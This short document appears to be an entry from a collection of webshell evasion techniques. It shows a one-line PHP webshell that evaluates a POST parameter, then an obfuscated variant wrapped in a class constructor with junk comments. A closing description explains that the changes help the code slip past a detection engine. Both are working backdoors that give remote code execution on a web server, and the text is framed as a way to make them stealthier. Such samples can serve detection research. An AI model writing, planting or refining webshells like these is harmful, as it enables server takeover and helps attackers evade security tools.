Original webshell sample:

'''
<?php @eval($_POST('a'));?>
'''

Webshell obtained after using the corresponding method:

'''
<?php
class x
{
 
        function __construct()
        {      
                @eval("/*sasas23123*/".$_POST['a']."/*sdfw3123*/");
        }

}
new x();

?>
'''

Description:

The above code uses the method of 'Add unrelated comments' to prevent the attack code from being directly spliced into 'eval($_POST['a'])' to be recognized by the check engine, and uses the class and constructor encapsulation in the php language to further increase the stealthiness of the code.
